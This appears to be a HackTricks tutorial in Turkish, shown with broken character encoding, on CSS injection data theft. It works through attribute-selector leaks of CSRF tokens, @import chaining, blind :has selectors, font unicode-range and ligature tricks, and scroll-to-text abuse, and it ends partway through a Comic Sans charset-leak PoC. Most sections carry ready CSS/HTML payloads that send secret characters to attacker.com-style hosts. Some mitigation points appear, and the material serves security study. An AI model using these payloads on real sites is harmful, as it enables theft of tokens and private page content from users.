# CSS Enjeksiyonu

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## CSS Enjeksiyonu

### Ã–znitelik SeÃ§ici

CSS seÃ§icileri, bir `input` elementinin `name` ve `value` Ã¶zniteliklerinin deÄŸerlerini eÅŸleÅŸtirmek iÃ§in oluÅŸturulur. EÄŸer input elementinin value Ã¶zniteliÄŸi belirli bir karakterle baÅŸlarsa, Ã¶nceden tanÄ±mlanmÄ±ÅŸ bir harici kaynak yÃ¼klenir:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
Ancak, bu yaklaÅŸÄ±m gizli giriÅŸ elemanlarÄ±yla (`type="hidden"`) uÄŸraÅŸÄ±rken bir sÄ±nÄ±rlamayla karÅŸÄ±laÅŸÄ±r Ã§Ã¼nkÃ¼ gizli elemanlar arka planlarÄ± yÃ¼klemez.

#### Gizli Elemanlar Ä°Ã§in Atlama

Bu sÄ±nÄ±rlamayÄ± aÅŸmak iÃ§in, `~` genel kardeÅŸ birleÅŸtiricisini kullanarak bir sonraki kardeÅŸ elemana hedef alabilirsiniz. CSS kuralÄ±, gizli giriÅŸ elemanÄ±nÄ± takip eden tÃ¼m kardeÅŸlere uygulanÄ±r ve arka plan resmi yÃ¼klenir:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
CSS Enjeksiyonu tekniÄŸini sÃ¶mÃ¼rmenin pratik bir Ã¶rneÄŸi, saÄŸlanan kod parÃ§acÄ±ÄŸÄ±nda detaylÄ± bir ÅŸekilde aÃ§Ä±klanmÄ±ÅŸtÄ±r. [Buradan](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e) gÃ¶rÃ¼ntÃ¼leyebilirsiniz.

#### CSS Enjeksiyonu iÃ§in Ã–nkoÅŸullar

CSS Enjeksiyonu tekniÄŸinin etkili olabilmesi iÃ§in belirli koÅŸullarÄ±n saÄŸlanmasÄ± gerekmektedir:

1. **Payload UzunluÄŸu**: CSS enjeksiyon vektÃ¶rÃ¼, oluÅŸturulan seÃ§icileri barÄ±ndÄ±racak kadar uzun payloadlarÄ± desteklemelidir.
2. **CSS Yeniden DeÄŸerlendirme**: CSS'nin yeni oluÅŸturulan payloadlarla yeniden deÄŸerlendirilmesini tetiklemek iÃ§in sayfayÄ± Ã§erÃ§evelemek iÃ§in yeteneÄŸe sahip olmanÄ±z gerekmektedir.
3. **Harici Kaynaklar**: Teknik, harici barÄ±ndÄ±rÄ±lan gÃ¶rÃ¼ntÃ¼leri kullanma yeteneÄŸini varsayar. Bu, sitenin Ä°Ã§erik GÃ¼venlik PolitikasÄ± (CSP) tarafÄ±ndan kÄ±sÄ±tlanabilir.

### KÃ¶r Ã–znitelik SeÃ§ici

[**Bu yazÄ±da aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://portswigger.net/research/blind-css-exfiltration), **`:has`** ve **`:not`** seÃ§icilerini birleÅŸtirerek kÃ¶r Ã¶ÄŸelerden bile iÃ§eriÄŸi tanÄ±mlamak mÃ¼mkÃ¼ndÃ¼r. Bu, CSS enjeksiyonu yapan web sayfasÄ±nÄ±n iÃ§inde ne olduÄŸunu hiÃ§ bilmediÄŸiniz durumlarda Ã§ok kullanÄ±ÅŸlÄ±dÄ±r.\
AyrÄ±ca, bu seÃ§icileri aynÄ± tÃ¼rden birkaÃ§ bloktan bilgi Ã§Ä±karmak iÃ§in de kullanabilirsiniz, Ã¶rneÄŸin:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
Bu, aÅŸaÄŸÄ±daki **@import** tekniÄŸi ile birleÅŸtirildiÄŸinde, **kÃ¶rdÃ¼ÄŸÃ¼m sayfalardan CSS enjeksiyonu kullanarak bilgi sÄ±zdÄ±rmak mÃ¼mkÃ¼ndÃ¼r**. [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

Ã–nceki teknik bazÄ± dezavantajlara sahiptir, Ã¶nkoÅŸullarÄ± kontrol edin. Ya **kurban'a birden fazla baÄŸlantÄ± gÃ¶nderebilmelisiniz**, ya da **CSS enjeksiyonu aÃ§Ä±ÄŸÄ± olan sayfayÄ± iframe'leyebilmelisiniz**.

Ancak, teknik kalitesini artÄ±rmak iÃ§in **CSS `@import`** kullanan baÅŸka bir akÄ±llÄ± teknik vardÄ±r.

Bu ilk olarak [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) tarafÄ±ndan gÃ¶sterildi ve ÅŸu ÅŸekilde Ã§alÄ±ÅŸÄ±r:

Ã–nceki gibi aynÄ± sayfayÄ± defalarca farklÄ± yÃ¼klerle yÃ¼klemek yerine (Ã¶ncekine benzer ÅŸekilde), **sayfayÄ± sadece bir kez ve sadece saldÄ±rganÄ±n sunucusuna bir import ile yÃ¼kleyeceÄŸiz** (bu, kurban'a gÃ¶nderilecek yÃ¼k).
```css
@import url('//attacker.com:5001/start?');
```
1. Ä°mport, saldÄ±rganlardan **bazÄ± CSS betiklerini alacak** ve **tarayÄ±cÄ± bunu yÃ¼kleyecek**.
2. SaldÄ±rganÄ±n gÃ¶ndereceÄŸi CSS betiÄŸinin ilk kÄ±smÄ±, saldÄ±rganÄ±n sunucusuna **baÅŸka bir `@import` isteÄŸi** olacak.
1. HenÃ¼z saldÄ±rganÄ±n sunucusu bu isteÄŸi yanÄ±tlamayacak, Ã§Ã¼nkÃ¼ bazÄ± karakterleri sÄ±zdÄ±rmak ve ardÄ±ndan bu import isteÄŸine sÄ±zdÄ±rmak iÃ§in yanÄ±t vereceÄŸiz.
3. Payload'Ä±n ikinci ve daha bÃ¼yÃ¼k kÄ±smÄ±, bir **Ã¶znitelik seÃ§ici sÄ±zÄ±ntÄ± payloadu** olacak.
1. Bu, saldÄ±rganÄ±n sunucusuna gizemin **ilk karakterini ve son karakterini** gÃ¶nderecek.
4. SaldÄ±rganÄ±n sunucusu, **gizemin ilk ve son karakterini** aldÄ±ÄŸÄ±nda, adÄ±m 2'de istenen import isteÄŸini **yanÄ±tlayacak**.
1. YanÄ±t, adÄ±mlar 2, 3 ve 4 ile tamamen aynÄ± olacak, ancak bu sefer **gizemin ikinci karakterini ve ardÄ±ndan sondan bir Ã¶ncekini** bulmaya Ã§alÄ±ÅŸacak.

SaldÄ±rgan, gizemi tamamen sÄ±zdÄ±rmayÄ± baÅŸarana kadar bu dÃ¶ngÃ¼yÃ¼ **takip edecektir**.

Orijinal [**Pepe Vila'nÄ±n bu aÃ§Ä±ÄŸÄ± sÃ¶mÃ¼rmek iÃ§in yazdÄ±ÄŸÄ± kodu burada bulabilirsiniz**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) veya neredeyse aynÄ± olan [**ancak yorumlanmÄ±ÅŸ kodu burada bulabilirsiniz**.](./#css-injection)

{% hint style="info" %}
Betik, her seferinde 2 karakter keÅŸfetmeye Ã§alÄ±ÅŸacak (baÅŸtan ve sondan) Ã§Ã¼nkÃ¼ Ã¶znitelik seÃ§ici, ÅŸunlarÄ± yapmaya izin verir:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
Bu, betiÄŸin sÄ±rrÄ± daha hÄ±zlÄ± sÄ±zdÄ±rmasÄ±na izin verir.
{% endhint %}

{% hint style="warning" %}
Bazen betik, keÅŸfedilen Ã¶nek + sonek'in zaten tam bayrak olduÄŸunu doÄŸru bir ÅŸekilde tespit etmez ve ileri (Ã¶nek) ve geri (sonek) doÄŸru devam eder ve bir noktada takÄ±lÄ±r.\
EndiÅŸelenmeyin, sadece **Ã§Ä±ktÄ±yÄ± kontrol edin** Ã§Ã¼nkÃ¼ **bayraÄŸÄ± orada gÃ¶rebilirsiniz**.
{% endhint %}

### DiÄŸer seÃ§iciler

**CSS seÃ§icileri** ile DOM parÃ§alarÄ±na eriÅŸmenin diÄŸer yollarÄ±:

* **`.class-to-search:nth-child(2)`**: Bu, DOM'da "class-to-search" sÄ±nÄ±fÄ±na sahip ikinci Ã¶ÄŸeyi arar.
*   **`:empty`** seÃ§ici: Ã–rneÄŸin [**bu yazÄ±da**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)** kullanÄ±lÄ±r:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### Hata tabanlÄ± XS-Search

**Referans:** [CSS tabanlÄ± SaldÄ±rÄ±: @font-face'in unicode-range'ini kÃ¶tÃ¼ye kullanma](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Hata TabanlÄ± XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

Genel amaÃ§, **kontrollÃ¼ bir uÃ§ noktadan Ã¶zel bir yazÄ± tipi kullanmak** ve belirtilen kaynak (`favicon.ico`) yÃ¼klenemezse, **metnin (bu durumda 'A') yalnÄ±zca bu yazÄ± tipiyle gÃ¶rÃ¼ntÃ¼lenmesini saÄŸlamaktÄ±r**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **Ã–zel YazÄ± Tipi KullanÄ±mÄ±**:
- Ã–zel bir yazÄ± tipi, `<head>` bÃ¶lÃ¼mÃ¼ndeki `<style>` etiketi iÃ§inde `@font-face` kuralÄ± kullanÄ±larak tanÄ±mlanÄ±r.
- YazÄ± tipi `poc` olarak adlandÄ±rÄ±lÄ±r ve dÄ±ÅŸ bir kaynaktan (`http://attacker.com/?leak`) alÄ±nÄ±r.
- `unicode-range` Ã¶zelliÄŸi, belirli bir Unicode karakteri olan 'A' hedef alacak ÅŸekilde `U+0041` olarak ayarlanÄ±r.

2. **Yedek Metinli Nesne Ã–ÄŸesi**:
- `<body>` bÃ¶lÃ¼mÃ¼nde `id="poc0"` olan bir `<object>` Ã¶ÄŸesi oluÅŸturulur. Bu Ã¶ÄŸe, `http://192.168.0.1/favicon.ico` adresinden bir kaynaÄŸÄ± yÃ¼klemeye Ã§alÄ±ÅŸÄ±r.
- Bu Ã¶ÄŸenin `font-family` Ã¶zelliÄŸi, `<style>` bÃ¶lÃ¼mÃ¼nde tanÄ±mlanan `'poc'` olarak ayarlanÄ±r.
- Kaynak (`favicon.ico`) yÃ¼klenemezse, `<object>` etiketi iÃ§indeki yedek iÃ§erik (harf 'A') gÃ¶rÃ¼ntÃ¼lenir.
- DÄ±ÅŸ kaynak yÃ¼klenemezse, yedek iÃ§erik ('A') Ã¶zel `poc` yazÄ± tipi kullanÄ±larak render edilir.

### Metin ParÃ§asÄ±na KaydÄ±rma Stili

**`:target`** yalancÄ±-sÄ±nÄ±fÄ±, [CSS SeÃ§icileri 4. DÃ¼zey belirtiminde](https://drafts.csswg.org/selectors-4/#the-target-pseudo) belirtildiÄŸi gibi, bir **URL parÃ§asÄ±** tarafÄ±ndan hedeflenen bir Ã¶ÄŸeyi seÃ§mek iÃ§in kullanÄ±lÄ±r. `::target-text`'in, metin aÃ§Ä±kÃ§a parÃ§a tarafÄ±ndan hedeflenmediÄŸi sÃ¼rece hiÃ§bir Ã¶ÄŸeyle eÅŸleÅŸmediÄŸini anlamak Ã¶nemlidir.

GÃ¼venlik endiÅŸesi, saldÄ±rganlarÄ±n HTML enjeksiyonu aracÄ±lÄ±ÄŸÄ±yla kendi sunucularÄ±ndan bir kaynaÄŸÄ± yÃ¼kleyerek web sayfasÄ±nda belirli bir metnin varlÄ±ÄŸÄ±nÄ± doÄŸrulamalarÄ±na izin veren **Metin ParÃ§asÄ±na KaydÄ±rma** Ã¶zelliÄŸini istismar etmeleri durumunda ortaya Ã§Ä±kar. Bu yÃ¶ntem, aÅŸaÄŸÄ±daki gibi bir CSS kuralÄ±nÄ±n enjekte edilmesini iÃ§erir:
```css
:target::before { content : url(target.png) }
```
Bu tÃ¼r senaryolarda, sayfada "YÃ¶netici" metni bulunuyorsa, sunucudan `target.png` kaynaÄŸÄ± istenir ve metnin varlÄ±ÄŸÄ±nÄ± gÃ¶sterir. Bu saldÄ±rÄ±nÄ±n bir Ã¶rneÄŸi, enjekte edilmiÅŸ CSS'yi yanÄ±nda bir Scroll-to-text parÃ§asÄ±yla gÃ¶mmÃ¼ÅŸ Ã¶zel olarak oluÅŸturulmuÅŸ bir URL aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸtirilebilir:
```
http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
```
Ä°ÅŸte, saldÄ±rÄ± HTML enjeksiyonunu manipÃ¼le ederek CSS kodunu iletiyor ve Scroll-to-text parÃ§asÄ± (`#:~:text=Administrator`) aracÄ±lÄ±ÄŸÄ±yla belirli metin "YÃ¶netici" hedefleniyor. Metin bulunursa, belirtilen kaynak yÃ¼klenir ve yanlÄ±ÅŸlÄ±kla varlÄ±ÄŸÄ± saldÄ±rgan tarafÄ±ndan sinyal verilir.

Azaltma iÃ§in aÅŸaÄŸÄ±daki noktalara dikkat edilmelidir:

1. **KÄ±sÄ±tlÄ± STTF EÅŸleÅŸtirme**: Scroll-to-text Fragment (STTF) yalnÄ±zca kelimeleri veya cÃ¼mleleri eÅŸleÅŸtirmek Ã¼zere tasarlanmÄ±ÅŸtÄ±r, bu da keyfi sÄ±rlarÄ± veya belirteÃ§leri sÄ±zdÄ±rma yeteneÄŸini sÄ±nÄ±rlar.
2. **Ãœst DÃ¼zey GÃ¶z Atma BaÄŸlamlarÄ±na KÄ±sÄ±tlama**: STTF yalnÄ±zca Ã¼st dÃ¼zey gÃ¶z atma baÄŸlamlarÄ±nda Ã§alÄ±ÅŸÄ±r ve iframe'ler iÃ§inde Ã§alÄ±ÅŸmaz, bu da herhangi bir sÃ¶mÃ¼rÃ¼ giriÅŸiminin kullanÄ±cÄ± tarafÄ±ndan daha fark edilebilir olmasÄ±nÄ± saÄŸlar.
3. **KullanÄ±cÄ± EtkinleÅŸtirmesinin GerekliliÄŸi**: STTF, Ã§alÄ±ÅŸmak iÃ§in bir kullanÄ±cÄ± etkinleÅŸtirme hareketi gerektirir, bu da sÃ¶mÃ¼rÃ¼lerin yalnÄ±zca kullanÄ±cÄ± tarafÄ±ndan baÅŸlatÄ±lan gezinmeler aracÄ±lÄ±ÄŸÄ±yla mÃ¼mkÃ¼n olduÄŸu anlamÄ±na gelir. Bu gereklilik, saldÄ±rÄ±larÄ±n kullanÄ±cÄ± etkileÅŸimi olmadan otomatikleÅŸtirilmesi riskini Ã¶nemli Ã¶lÃ§Ã¼de azaltÄ±r. Bununla birlikte, blog yazÄ±sÄ±nÄ±n yazarÄ±, saldÄ±rÄ±nÄ±n otomatikleÅŸtirilmesini kolaylaÅŸtÄ±rabilecek belirli koÅŸullar ve bypass'lar (Ã¶rneÄŸin, sosyal mÃ¼hendislik, yaygÄ±n tarayÄ±cÄ± uzantÄ±larÄ±yla etkileÅŸim) olduÄŸunu belirtmektedir.

Bu mekanizmalarÄ±n ve potansiyel gÃ¼venlik aÃ§Ä±klarÄ±nÄ±n farkÄ±nda olmak, web gÃ¼venliÄŸini korumak ve bÃ¶yle sÃ¶mÃ¼rÃ¼cÃ¼ taktiklere karÅŸÄ± korunmak iÃ§in Ã¶nemlidir.

Daha fazla bilgi iÃ§in orijinal raporu kontrol edin: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

Bu teknik iÃ§in bir CTF'de kullanÄ±lan bir [**sÃ¶mÃ¼rÃ¼yÃ¼ buradan kontrol edebilirsiniz**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).

### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

Sayfada **yalnÄ±zca belirli unicode deÄŸerleri mevcutsa toplanacak olan belirli unicode deÄŸerleri iÃ§in harici yazÄ± tipleri** belirtebilirsiniz. Ã–rneÄŸin:
```html
<style>
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?A); /* fetched */
unicode-range:U+0041;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?B); /* fetched too */
unicode-range:U+0042;
}
@font-face{
font-family:poc;
src: url(http://attacker.example.com/?C); /* not fetched */
unicode-range:U+0043;
}
#sensitive-information{
font-family:poc;
}
</style>

<p id="sensitive-information">AB</p>htm
```
Bu sayfaya eriÅŸtiÄŸinizde, Chrome ve Firefox "A" ve "B" karakterlerini iÃ§eren hassas bilgi metin dÃ¼ÄŸÃ¼mÃ¼nÃ¼ alÄ±r. Ancak Chrome ve Firefox "C" iÃ§ermediÄŸi iÃ§in "?C" alÄ±nmaz. Bu, "A" ve "B" yi okuyabildiÄŸimizi gÃ¶sterir.

### Metin dÃ¼ÄŸÃ¼mÃ¼ sÄ±zdÄ±rma (I): ligatÃ¼rler <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>

**Referans:** [Wykradanie danych w Å›wietnym stylu â€“ czyli jak wykorzystaÄ‡ CSS-y do atakÃ³w na webaplikacjÄ™](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

AÃ§Ä±klanan teknik, yazÄ± tipi ligatÃ¼rlerini sÃ¶mÃ¼rerek bir dÃ¼ÄŸÃ¼mden metin Ã§Ä±karmayÄ± ve geniÅŸlik deÄŸiÅŸikliklerini izlemeyi iÃ§erir. SÃ¼reÃ§ birkaÃ§ adÄ±mdan oluÅŸur:

1. **Ã–zel YazÄ± Tiplerinin OluÅŸturulmasÄ±**:
- SVG yazÄ± tipleri, iki karakter dizisini temsil eden bir glif iÃ§in geniÅŸ bir geniÅŸlik belirleyen `horiz-adv-x` Ã¶zniteliÄŸine sahip gliflerle oluÅŸturulur.
- Ã–rnek SVG glif: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, burada "XY" bir iki karakter dizisini temsil eder.
- Bu yazÄ± tipleri daha sonra fontforge kullanÄ±larak woff formatÄ±na dÃ¶nÃ¼ÅŸtÃ¼rÃ¼lÃ¼r.

2. **GeniÅŸlik DeÄŸiÅŸikliklerinin Tespiti**:
- Metnin kaymamasÄ±nÄ± saÄŸlamak iÃ§in CSS kullanÄ±lÄ±r (`white-space: nowrap`) ve kaydÄ±rma Ã§ubuÄŸu stilini Ã¶zelleÅŸtirmek iÃ§in.
- Yatay bir kaydÄ±rma Ã§ubuÄŸunun belirgin bir ÅŸekilde stilize edilmesi, belirli bir ligatÃ¼rÃ¼n ve dolayÄ±sÄ±yla belirli bir karakter dizisinin metinde bulunduÄŸunu gÃ¶steren bir gÃ¶sterge (oracle) olarak iÅŸlev gÃ¶rÃ¼r.
- Ä°lgili CSS:
```css
body { white-space: nowrap };
body::-webkit-scrollbar { background: blue; }
body::-webkit-scrollbar:horizontal { background: url(http://attacker.com/?leak); }
```

3. **SÃ¶mÃ¼rÃ¼ SÃ¼reci**:
- **AdÄ±m 1**: GeniÅŸ bir geniÅŸliÄŸe sahip karakter Ã§iftleri iÃ§in yazÄ± tipleri oluÅŸturulur.
- **AdÄ±m 2**: BÃ¼yÃ¼k geniÅŸlikli glifin (karakter Ã§ifti iÃ§in ligatÃ¼r) render edildiÄŸini tespit etmek iÃ§in bir kaydÄ±rma Ã§ubuÄŸu tabanlÄ± bir hile kullanÄ±lÄ±r, bu da karakter dizisinin varlÄ±ÄŸÄ±nÄ± gÃ¶sterir.
- **AdÄ±m 3**: Bir ligatÃ¼r tespit edildiÄŸinde, tespit edilen Ã§ifti iÃ§eren ve bir Ã¶nceki veya bir sonraki karakteri ekleyen Ã¼Ã§ karakter dizisini temsil eden yeni glifler oluÅŸturulur.
- **AdÄ±m 4**: ÃœÃ§ karakterli ligatÃ¼rÃ¼n tespiti gerÃ§ekleÅŸtirilir.
- **AdÄ±m 5**: SÃ¼reÃ§ tekrarlanÄ±r, tÃ¼m metin aÅŸamalÄ± olarak ortaya Ã§Ä±kar.

4. **Optimizasyon**:
- Mevcut `<meta refresh=...` ile baÅŸlatma yÃ¶ntemi en iyisi deÄŸildir.
- Daha verimli bir yaklaÅŸÄ±m, sÃ¶mÃ¼rÃ¼nÃ¼n performansÄ±nÄ± artÄ±ran CSS `@import` hilesini iÃ§erebilir.

### Metin dÃ¼ÄŸÃ¼mÃ¼ sÄ±zdÄ±rma (II): varsayÄ±lan bir yazÄ± tipiyle karakter kÃ¼mesi sÄ±zdÄ±rma (harici varlÄ±klar gerektirmez) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**Referans:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)

Bu hile, bu [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what\_can\_we\_do\_with\_single\_css\_injection/) sayfasÄ±nda yayÄ±nlandÄ±. Bir metin dÃ¼ÄŸÃ¼mÃ¼nde kullanÄ±lan karakter kÃ¼mesi, tarayÄ±cÄ±ya yÃ¼klenen varsayÄ±lan yazÄ± tipleri kullanÄ±larak sÄ±zdÄ±rÄ±labilir: harici veya Ã¶zel yazÄ± tiplerine ihtiyaÃ§ yoktur.

Kavram, bir `div`'in geniÅŸliÄŸini aÅŸamalÄ± olarak geniÅŸletmek iÃ§in bir animasyon kullanmayÄ± iÃ§erir, bÃ¶ylece bir seferde bir karakterin 'sonek' kÄ±smÄ±ndan 'Ã¶nek' kÄ±smÄ±na geÃ§mesine izin verir. Bu sÃ¼reÃ§ metni iki bÃ¶lÃ¼me ayÄ±rÄ±r:

1. **Ã–nek**: Ä°lk satÄ±r.
2. **Sonek**: Sonraki satÄ±r(lar).

Karakterlerin geÃ§iÅŸ aÅŸamalarÄ± aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼necektir:

**C**\
ADB

**CA**\
DB

**CAD**\
B

**CADB**


Bu geÃ§iÅŸ sÄ±rasÄ±nda, **unicode-range hilesi** her yeni karakterin Ã¶ne katÄ±lmasÄ±nÄ± belirlemek iÃ§in kullanÄ±lÄ±r. Bu, yazÄ± tipinin Comic Sans olarak deÄŸiÅŸtirilerek gerÃ§ekleÅŸtirilir, bu yazÄ± tipi varsayÄ±lan yazÄ± tipinden daha uzundur, bu da dikey bir kaydÄ±rma Ã§ubuÄŸunu tetikler. Bu kaydÄ±rma Ã§ubuÄŸunun gÃ¶rÃ¼nÃ¼mÃ¼, Ã¶nek kÄ±smÄ±nda yeni bir karakterin varlÄ±ÄŸÄ±nÄ± dolaylÄ± olarak ortaya Ã§Ä±karÄ±r.

Bu yÃ¶ntem, karakterlerin ortaya Ã§Ä±ktÄ±ÄŸÄ± gibi benzersiz karakterlerin tespitine olanak saÄŸlar, ancak tekrarlanan hangi karakterin olduÄŸunu belirtmez, yalnÄ±zca bir tekrarÄ±n gerÃ§ekleÅŸtiÄŸini gÃ¶sterir.

{% hint style="info" %}
Temel olarak, **unicode-range bir karakteri tespit etmek iÃ§in kullanÄ±lÄ±r**, ancak harici bir yazÄ± tipi yÃ¼klemek istemediÄŸimiz iÃ§in baÅŸka bir yol bulmamÄ±z gerekiyor.\
**Karakter** bulunduÄŸunda, **Ã¶nceden yÃ¼klenmiÅŸ Comic Sans yazÄ± tipi** verilir, bu da karakteri **bÃ¼yÃ¼tÃ¼r** ve **bir kaydÄ±rma Ã§ubuÄŸu tetikler**, bu da bulunan karakteri **sÄ±zdÄ±rÄ±r**.
{% endhint %}

PoC'dan Ã§Ä±karÄ±lan kodu kontrol edin:
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
